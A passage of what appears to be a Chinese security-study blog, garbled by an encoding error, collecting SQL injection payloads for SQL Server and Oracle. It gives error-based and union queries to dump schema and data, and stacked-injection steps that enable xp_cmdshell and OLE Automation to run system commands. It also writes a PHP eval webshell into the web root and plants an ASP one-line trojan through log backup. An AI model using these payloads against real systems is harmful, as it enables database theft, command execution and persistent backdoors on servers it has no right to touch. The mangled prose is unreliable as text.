<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mssql">UNION all SELECT 1,2,name from jiaofan..syscolumns where id = (select id from æ•°æ®åº“åç§°..sysobjects where name = è¡¨å)<br></code></pre></td></tr></table></figure>
</li>
<li><p>è·å–å…¨éƒ¨å†…å®¹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mssql">UNION all SELECT 1,2,åˆ—å from  è¡¨å<br></code></pre></td></tr></table></figure></li>
</ol>
<hr>
<p>ä¸€å¥—æµç¨‹ä¸‹æ¥ï¼Œå’ŒMySQLå·®ä¸å¤šï¼Œå¯è§æ•°æ®åº“è¯­è¨€éƒ½æ˜¯è§¦ç±»æ—é€šçš„</p>
<p>æ¥ä¸‹æ¥ä»‹ç»ä¸€ä¸‹sqlserveræŠ¥é”™æ³¨å…¥</p>
<h3 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h3><p>ä»¥ä¸‹è¯­å¥å‡ä¸ºå­—ç¬¦å‹æ³¨å…¥ä¸‹ï¼Œå¹¶ç»™å‡ºå¤šä¸ªpayload</p>
<ol>
<li><p>è·å–å½“å‰æ•°æ®åº“ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mssql">and 1=(select db_name())<br><br>and 1=convert(int,(select db_name()))<br></code></pre></td></tr></table></figure>
</li>
<li><p>è·å–æ•°æ®åº“ä¸­çš„è¡¨åï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mssql">and 1= (select top 1 name from æ•°æ®åº“å..sysobjects where xtype = 0x75) <br>æ³¨ï¼šä½¿ç”¨æ­¤è¯­å¥éœ€è¦ä¿®æ”¹topåçš„æ•°å­—<br><br>and 1=convert(int,(select top 1 name from æ•°æ®åº“å.sys.objects where type=&#x27;U&#x27;))<br>æ³¨ï¼šä½¿ç”¨æ­¤è¯­å¥éœ€è¦ä¿®æ”¹topåçš„æ•°å­—<br><br>and 1=convert(int,stuff((select  quotename(name) from æ•°æ®åº“å.sys.objects where type=&#x27;U&#x27; for xml path(&#x27;&#x27;)),1,0,&#x27;&#x27;))<br>æ­¤è¯­å¥è·å–æ•°æ®åº“ä¸‹çš„å…¨éƒ¨è¡¨<br></code></pre></td></tr></table></figure>
</li>
<li><p>è·å–è¡¨ä¸­çš„åˆ—å</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mssql">and 1=(select top 1 c.name from æ•°æ®åº“å..syscolumns c ,æ•°æ®åº“å..sysobjects o where c.id = o.id and o.name=è¡¨å) <br>æ³¨ï¼šä½¿ç”¨æ­¤è¯­å¥éœ€è¦ä¿®æ”¹topåçš„æ•°å­—<br><br>and 1=convert(int,(select top 1 name from æ•°æ®åº“å.sys.columns where object_id=object_id(&#x27;è¡¨å&#x27;)))<br>æ³¨ï¼šä½¿ç”¨æ­¤è¯­å¥éœ€è¦ä¿®æ”¹topåçš„æ•°å­—<br><br>and 1=convert(int,stuff((select quotename(name) from æ•°æ®åº“å.sys.columns where object_id=object_id(&#x27;è¡¨å&#x27;) for xml path(&#x27;&#x27;)),1,0,&#x27;&#x27;))<br>æ­¤è¯­å¥è·å–è¡¨ä¸­çš„å…¨éƒ¨åˆ—<br></code></pre></td></tr></table></figure>
</li>
<li><p>dumpå…¨éƒ¨å†…å®¹ </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mssql">and 1=convert(int,(select top 1 åˆ—å from è¡¨å))<br>æ³¨ï¼šä½¿ç”¨æ­¤è¯­å¥éœ€è¦ä¿®æ”¹topåçš„æ•°å­—<br><br>and 1=convert(int,stuff((select quotename(åˆ—å) from è¡¨å for xml path(&#x27;&#x27;)),1,0,&#x27;&#x27;))<br>æ­¤è¯­å¥dumpå…¨éƒ¨å†…å®¹<br></code></pre></td></tr></table></figure></li>
</ol>
<h2 id="GetShell-1"><a href="#GetShell-1" class="headerlink" title="GetShell"></a>GetShell</h2><h3 id="å †å æ³¨å…¥ä¸‹getshell"><a href="#å †å æ³¨å…¥ä¸‹getshell" class="headerlink" title="å †å æ³¨å…¥ä¸‹getshell"></a>å †å æ³¨å…¥ä¸‹getshell</h3><h4 id="ç›´æ¥é€šè¿‡ç‰¹æ®Šå‡½æ•°-getshell"><a href="#ç›´æ¥é€šè¿‡ç‰¹æ®Šå‡½æ•°-getshell" class="headerlink" title="ç›´æ¥é€šè¿‡ç‰¹æ®Šå‡½æ•° getshell"></a>ç›´æ¥é€šè¿‡ç‰¹æ®Šå‡½æ•° getshell</h4><p>ä¸€ã€<strong>xp_cmdshell</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mssql">EXEC sp_configure &#x27;show advanced options&#x27;, 1;RECONFIGURE;EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;RECONFIGURE;<br></code></pre></td></tr></table></figure>

<p>å¦‚æœå¼€å¯æˆåŠŸäº†ï¼Œé‚£ä¹ˆå°±å¯ä»¥ä½¿ç”¨å¦‚ä¸‹ä»£ç æ¥æ‰§è¡Œcmdå‘½ä»¤ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=1;use master;exec master..xp_cmdshell &quot;whoami&quot;;<br></code></pre></td></tr></table></figure>

<p>è·å–äº†shellä¹‹åå¯ä»¥ä½¿ç”¨è¿™ä¸ªå‘½ä»¤æ¥æŸ¥æ‰¾ç½‘ç«™ç»å¯¹è·¯å¾„</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">for %i in (c d e f g h i j k l m n o p q r s t u v w x v z) do @(dir/s/b %i:\F12çœ‹åˆ°çš„è°ƒç”¨æ–‡ä»¶)<br></code></pre></td></tr></table></figure>

<p>äºŒã€<strong>xp_dirtree</strong></p>
<p>xp_dirtreeæœ‰ä¸‰ä¸ªå‚æ•°ï¼Œ</p>
<ol>
<li>è¦åˆ—çš„ç›®å½•</li>
<li>æ˜¯å¦è¦åˆ—å‡ºå­ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å’Œæ–‡ä»¶å¤¹ï¼Œé»˜è®¤ä¸º0ï¼Œå¦‚æœä¸éœ€è¦è®¾ç½®ä¸º1</li>
<li>æ˜¯å¦éœ€è¦åˆ—å‡ºæ–‡ä»¶ï¼Œé»˜è®¤ä¸ºä¸åˆ—ï¼Œå¦‚æœéœ€è¦åˆ—æ–‡ä»¶è®¾ç½®ä¸º1</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mssql">xp_dirtree &#x27;c:\&#x27;, 1, 1      #åˆ—å‡ºå½“å‰ç›®å½•ä¸‹æ‰€æœ‰çš„æ–‡ä»¶å’Œæ–‡ä»¶å¤¹<br></code></pre></td></tr></table></figure>

<p>é€šè¿‡å †å æ³¨å…¥å»ºè¡¨ï¼Œå°†è¾“å‡ºæ’å…¥è¡¨é‡Œï¼Œé€šè¿‡æ³¨å…¥å°†è¡¨åˆ—å‡ºæ¥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mssql">?id=1;create table dir(subdirectory varchar(255),depth int, filee int);insert into dir(subdirectory,depth,filee) exec xp_dirtree &#x27;c:\&#x27;,1,1<br></code></pre></td></tr></table></figure>

<p>å› ä¸ºxp_dirtreeè¾“å‡ºæ˜¯ä¸‰ä¸ªå­—æ®µçš„æ‰€ä»¥è¦åˆ›å»ºä¸€ä¸ªä¸‰ä¸ªå­—æ®µçš„è¡¨ ï¼Œå­—æ®µåå¯ä»¥éšä¾¿å–</p>
<p>ä¸‰ã€<strong>xp_subdirs</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mssql">xp_subdirs &#x27;c:\&#x27;<br></code></pre></td></tr></table></figure>

<p>è¿™ä¸ªæ–¹æ³•å’Œä¸Šé¢çš„ä¸€æ ·ï¼Œç¼ºç‚¹æ˜¯ä¸èƒ½åˆ—å‡ºæ–‡ä»¶</p>
<hr>
<p>ä»¥ä¸Šä»…æ˜¯é’ˆå¯¹äºsqlserverç‰¹æ®Šå‡½æ•°çš„è·å–ç»å¯¹è·¯å¾„æ–¹æ³•ï¼Œæ™®éé€šç”¨çš„æ–¹æ³•è¿™é‡Œä¸å±•å¼€å™è¿°</p>
<h4 id="é—´æ¥é€šè¿‡vbs-getshell"><a href="#é—´æ¥é€šè¿‡vbs-getshell" class="headerlink" title="é—´æ¥é€šè¿‡vbs getshell"></a>é—´æ¥é€šè¿‡vbs getshell</h4><p>ä¸€ã€<strong>sp_oacreate</strong></p>
<p>*1.1</p>
<p>é€šè¿‡å †å æ³¨å…¥å¼€å¯sp_oacreate</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mssql">exec sp_configure &#x27;show advanced options&#x27;, 1;RECONFIGURE<br>exec sp_configure &#x27;Ole Automation Procedures&#x27;,1;RECONFIGURE<br></code></pre></td></tr></table></figure>

<p>æˆåŠŸåï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mssql">declare @o int;<br>exec sp_oacreate &#x27;wscript.shell&#x27;,@o out;<br>exec sp_oamethod @o,&#x27;run&#x27;,null,&#x27;cmd /c mkdir c:\temp&#x27;;<br>exec sp_oamethod @o,&#x27;run&#x27;,null,&#x27;cmd /c &quot;net user&quot; &gt; c:\temp\user.txt&#x27;;<br>create table cmd_output (output text);<br>BULK INSERT cmd_output FROM &#x27;c:\temp\user.txt&#x27; WITH (FIELDTERMINATOR=&#x27;n&#x27;,ROWTERMINATOR = &#x27;nn&#x27;)      -- æ‹¬å·é‡Œé¢ä¸¤ä¸ªå‚æ•°æ˜¯è¡Œå’Œåˆ—çš„åˆ†éš”ç¬¦ï¼Œéšä¾¿å†™å°±è¡Œ<br>select * from cmd_output<br></code></pre></td></tr></table></figure>

<p>åˆ—å‡ºcmd_outputå¾—åˆ°å‘½ä»¤ç»“æœ</p>
<p>å¦‚æœè¿™ä¸ªå‘½ä»¤æ‰§è¡ŒæˆåŠŸï¼Œä¼šè¿”å›0</p>
<hr>
<p>*1.2</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mssql">declare @f int,@g int<br>exec sp_oacreate &#x27;Scripting.FileSystemObject&#x27;,@f output<br>EXEC SP_OAMETHOD @f,&#x27;CreateTextFile&#x27;,@f OUTPUT,&#x27;c:\inetpub\wwwroot\cmd.vbs&#x27;,1<br>EXEC sp_oamethod  @f,&#x27;WriteLine&#x27;,null,&#x27;Set objShell = CreateObject(&quot;Shell.Application&quot;)<br>objShell.ShellExecute &quot;cmd&quot;, &quot;cmd /c whoami&gt;c:\whoami.txt&quot;, &quot;&quot;, &quot;runas&quot;,1&#x27;<br>declare @o int<br><br>exec sp_oacreate &#x27;Shell.Application&#x27;, @o out<br>exec sp_oamethod @o, &#x27;ShellExecute&#x27;,null, &#x27;cmd.exe&#x27;,&#x27;cmd /c net user &gt;c:\test.txt&#x27;,&#x27;c:\windows\system32&#x27;,&#x27;&#x27;,&#x27;1&#x27;; --æ”¯æŒ2005ï¼Œä¸æ”¯æŒ2008<br><br>exec sp_oamethod @o,&#x27;ShellExecute&#x27;,null,&#x27;c:\inetpub\wwwroot\cmd.vbs&#x27;, &#x27;&#x27;, &#x27;c:\&#x27;, &#x27;&#x27;, 0 --æˆåŠŸ<br></code></pre></td></tr></table></figure>

<p>ç„¶åå’Œä¸Šé¢ä¸€æ ·å†™å…¥è¡¨é‡Œåº”è¯¥å°±å¯ä»¥äº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mssql">create table cmd_output (output text);<br>BULK INSERT cmd_output FROM &#x27;c:\whoami.txt&#x27; WITH (FIELDTERMINATOR=&#x27;n&#x27;,ROWTERMINATOR = &#x27;nn&#x27;)      -- æ‹¬å·é‡Œé¢ä¸¤ä¸ªå‚æ•°æ˜¯è¡Œå’Œåˆ—çš„åˆ†éš”ç¬¦ï¼Œéšä¾¿å†™å°±è¡Œ<br>select * from cmd_output<br></code></pre></td></tr></table></figure>

<p>ç„¶åæœ€åä¸€æ­¥å†™shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mssql">declare @f int,@g int<br>exec sp_oacreate &#x27;Scripting.FileSystemObject&#x27;,@f output<br>EXEC SP_OAMETHOD @f,&#x27;CreateTextFile&#x27;,@f OUTPUT,&#x27;c:\inetpub\wwwroot\shell.php&#x27;,1<br>EXEC sp_oamethod  @f,&#x27;WriteLine&#x27;,null,&#x27;&lt;?php @eval(POST[&#x27;cmd&#x27;])?&gt;&#x27;<br></code></pre></td></tr></table></figure>

<h3 id="å¤‡ä»½getshell"><a href="#å¤‡ä»½getshell" class="headerlink" title="å¤‡ä»½getshell"></a>å¤‡ä»½getshell</h3><p><strong>éœ€è¦çŸ¥é“ç»å¯¹è·¯å¾„</strong></p>
<p>testdbæ˜¯å½“å‰æ•°æ®åº“</p>
<p>ç½‘ä¸ŠæŸ¥åˆ°ä¸¤ç§æ–¹æ³•ï¼Œä¸€ç§æ˜¯å·®å¼‚å¤‡ä»½ä¸€ç§æ˜¯logå¤‡ä»½</p>
<p>å·®å¼‚å¤‡ä»½2005å’Œ2008å‡æ²¡æœ‰å¤ç°æˆåŠŸ</p>
<p>05ä¼šä¸€ç›´æŠ¥å°‘ä¸€ä¸ª%&gt;æ ‡è®°ï¼Œ08ä¼šå¤šä¸€ä¸ª&lt;%ç„¶åæŠ¥é”™ï¼Œå¦‚æœæœ‰è§£å†³çš„å¤§ä½¬å¸Œæœ›å¯ä»¥å‘ŠçŸ¥ä¸€ä¸‹ï¼Œæå‰æ„Ÿè°¢</p>
<p>logå¤‡ä»½</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mssql">alter database testdb set RECOVERY FULL <br>backup database testdb to disk = &#x27;c:\bak.bak&#x27;<br>create table cmd (a image) <br>backup log testdb to disk = &#x27;c:\aaa.bak&#x27; with init <br>insert into cmd (a) values (0x3C25657865637574652872657175657374282261222929253E) <br>backup log testdb to disk = &#x27;C:\inetpub\wwwroot\shell.asp&#x27;<br></code></pre></td></tr></table></figure>

<p>ä¸¤ä¸ªæ•°æ®åº“éƒ½å¯ä»¥æˆåŠŸï¼Œå¤‡ä»½æ–‡ä»¶å°ï¼Œä¸å®¹æ˜“å‡ºç°è„æ•°æ®</p>
<p>æ³¨ï¼š0x3C25657865637574652872657175657374282261222929253Eæ˜¯aspä¸€å¥è¯æœ¨é©¬ï¼Œå¦‚æœå…¶ä»–è¯­è¨€ä¹Ÿéœ€è¦æ›´æ”¹16è¿›åˆ¶çš„å†…å®¹</p>
<hr>
<p>åé¢æ–‡ç« é‡Œé¢è¿˜è®°å½•äº†ä¸€ä¸ªåŠ«æŒç²˜æ»é”®getshellçš„ï¼Œè¿™é‡Œæš‚æ—¶ä¸ä½œè®°å½•ï¼Œä¸ªäººè®¤ä¸ºå¯èƒ½ç”¨ä¸åˆ°</p>
<p>è¿™é‡Œæ‰¾åˆ°äº†ä¸€ä¸ªé¶åœºï¼š</p>
<p><a target="_blank" rel="noopener" href="https://github.com/Larryxi/MSSQL-SQLi-Labs">https://github.com/Larryxi/MSSQL-SQLi-Labs</a></p>
<p>ä¹‹åæœ‰ç©ºå¯èƒ½ä¼šçœ‹çœ‹å§ã€‚ã€‚ä¸ä¸€å®šä¼šå­¦çš„åƒMySQLä¸€æ ·ä»”ç»†</p>
<h1 id="Orancle"><a href="#Orancle" class="headerlink" title="Orancle"></a>Orancle</h1><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ayoung/p/15329033.html">https://www.cnblogs.com/ayoung/p/15329033.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wuhongbin/p/15582881.html">https://www.cnblogs.com/wuhongbin/p/15582881.html</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10469">https://xz.aliyun.com/t/10469</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9940">https://xz.aliyun.com/t/9940</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7897">https://xz.aliyun.com/t/7897</a></p>
</blockquote>
<h2 id="åˆ¤æ–­æ–¹æ³•-2"><a href="#åˆ¤æ–­æ–¹æ³•-2" class="headerlink" title="åˆ¤æ–­æ–¹æ³•"></a>åˆ¤æ–­æ–¹æ³•</h2><p>åˆ©ç”¨å‡½æ•°æ¥åˆ¤æ–­æ˜¯å¦oracleæ•°æ® å¦‚ï¼šand len(â€˜aâ€™)&#x3D;1<br>ï¼ˆåœ¨mssqlå’Œmysqlä»¥åŠdb2å†…ï¼Œè¿”å›é•¿åº¦å€¼æ˜¯è°ƒç”¨len()å‡½æ•°ï¼›åœ¨oracleå’ŒINFORMIXåˆ™æ˜¯é€šè¿‡length()æ¥è¿”å›é•¿åº¦å€¼ï¼Œä½†æ˜¯postgresqlä¹Ÿæ˜¯lengthï¼Œéœ€è¦æ³¨æ„ï¼‰<br>ä¹Ÿå¯ä»¥é€šè¿‡dualè¿›ä¸€æ­¥æ¥åˆ¤æ–­æ˜¯å¦ä¸ºoracle</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> dual <span class="hljs-keyword">where</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> dual)<span class="hljs-operator">&gt;</span><span class="hljs-number">1</span> <span class="hljs-comment">--</span><br><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> dual <span class="hljs-keyword">where</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> dual)<span class="hljs-operator">&gt;</span><span class="hljs-number">0</span> <span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure>

<h2 id="åŸºæœ¬æ³¨å…¥-2"><a href="#åŸºæœ¬æ³¨å…¥-2" class="headerlink" title="åŸºæœ¬æ³¨å…¥"></a>åŸºæœ¬æ³¨å…¥</h2><h3 id="è”åˆæŸ¥è¯¢-1"><a href="#è”åˆæŸ¥è¯¢-1" class="headerlink" title="è”åˆæŸ¥è¯¢"></a>è”åˆæŸ¥è¯¢</h3><ol>
<li><p>é—­åˆ åŒMySQL æ³¨é‡Šç¬¦ä¸º â€“+</p>
</li>
<li><p>åˆ¤æ–­å­—æ®µæ•°  åŒMySQL </p>
</li>
<li><p>è”åˆæŸ¥è¯¢æ‰¾å›æ˜¾ä½ åŒSql Server<br> Oracle æ•°æ®åº“æŸ¥è¯¢éœ€è¦ from dual (è™šè¡¨&#x2F;ä¼ªè¡¨) ä¸“ä¸ºæŸ¥è¯¢è¯­å¥è®¾ç½®çš„è¡¨</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">null</span>ä»£æ›¿æ‰€æœ‰ç±»å‹<br>id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span> <span class="hljs-keyword">from</span> dual<span class="hljs-comment">--</span><br>id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-keyword">from</span> dual<span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure>
</li>
<li><p>æŸ¥è¯¢æ•°æ®åº“ç‰ˆæœ¬ã€æ•°æ®åº“è¿æ¥ç”¨æˆ·ã€å½“å‰å®ä¾‹å </p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> banner <span class="hljs-keyword">from</span> sys.v_$version <span class="hljs-keyword">where</span> rownum<span class="hljs-operator">=</span><span class="hljs-number">1</span>),<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-keyword">from</span> dual<span class="hljs-comment">--</span><br>id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> SYS_CONTEXT(<span class="hljs-string">&#x27;USERENV&#x27;</span>,<span class="hljs-string">&#x27;CURRENT_USER&#x27;</span>) <span class="hljs-keyword">from</span> dual),<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-keyword">from</span> dual<span class="hljs-comment">-- #test</span><br>id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> instance_name <span class="hljs-keyword">from</span> v$instance),<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-keyword">from</span> dual<span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure>
</li>
<li><p>è·å–æ•°æ®åº“åï¼Œè¿™ä¸ªä¼¼ä¹æ²¡æœ‰ä»€ä¹ˆç”¨å¤„</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> SYS.DATABASE_NAME,<span class="hljs-string">&#x27;null2&#x27;</span> <span class="hljs-keyword">from</span> dual<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
</li>
<li><p>éå†è¡¨åï¼Œæ³•ä¸€</p>
  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,table_name,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span> <span class="hljs-keyword">from</span> user_tables <span class="hljs-keyword">where</span> rownum<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-comment">--</span><br>æŸ¥è¯¢ç¬¬ä¸€ä¸ªè¡¨åä¸ºNEWS<br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,table_name,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span> <span class="hljs-keyword">from</span> user_tables <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">&lt;&gt;</span><span class="hljs-string">&#x27;NEWS&#x27;</span><span class="hljs-comment">--</span><br>æŸ¥è¯¢ç¬¬äºŒä¸ªè¡¨åä¸ºADMIN<br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,table_name,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span> <span class="hljs-keyword">from</span> user_tables <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">&lt;&gt;</span><span class="hljs-string">&#x27;NEWS&#x27;</span> <span class="hljs-keyword">and</span> table_name<span class="hljs-operator">&lt;&gt;</span><span class="hljs-string">&#x27;ADMIN&#x27;</span><span class="hljs-comment">--</span><br>æŸ¥è¯¢ç¬¬ä¸‰ä¸ªè¡¨åä¸ºMD5<br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,table_name,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span> <span class="hljs-keyword">from</span> user_tables <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">&lt;&gt;</span><span class="hljs-string">&#x27;NEWS&#x27;</span> <span class="hljs-keyword">and</span> table_name<span class="hljs-operator">&lt;&gt;</span><span class="hljs-string">&#x27;ADMIN&#x27;</span> <span class="hljs-keyword">and</span> table_name<span class="hljs-operator">&lt;&gt;</span><span class="hljs-string">&#x27;MD5&#x27;</span><span class="hljs-comment">--</span><br>æç¤ºæ²¡æœ‰æ‰¾åˆ°å¯¹åº”çš„æ•°æ®å³ä¸€å…±åªæœ‰ä¸‰ä¸ªæ•°æ®è¡¨ï¼Œåˆ†åˆ«ä¸ºNEWSã€ADMINã€MD5<br></code></pre></td></tr></table></figure>
<p>  è¿™æ ·ä¸€ä¸ªä¸€ä¸ªçš„æŸ¥è¡¨æ•ˆç‡æœ‰ç‚¹ä½ï¼Œè¿˜å¯ä»¥å…ˆæŸ¥è¯¢ç”¨æˆ·åï¼Œå†ç”¨ç±»ä¼¼ mysql ä¸­ group_concat() çš„æ–¹å¼æŸ¥è¯¢è¡¨å</p>
</li>
</ol>
<p>æ³•äºŒï¼Œè¿™ä¸ªæ›´åŠ é«˜æ•ˆä¸€äº›</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> dual),<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span> <span class="hljs-keyword">from</span> dual<span class="hljs-comment">--</span><br>æŸ¥è¯¢ç”¨æˆ·åä¸ºORACLE1<br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">LISTAGG</span>(table_name,<span class="hljs-string">&#x27;,&#x27;</span>)<span class="hljs-keyword">within</span> <span 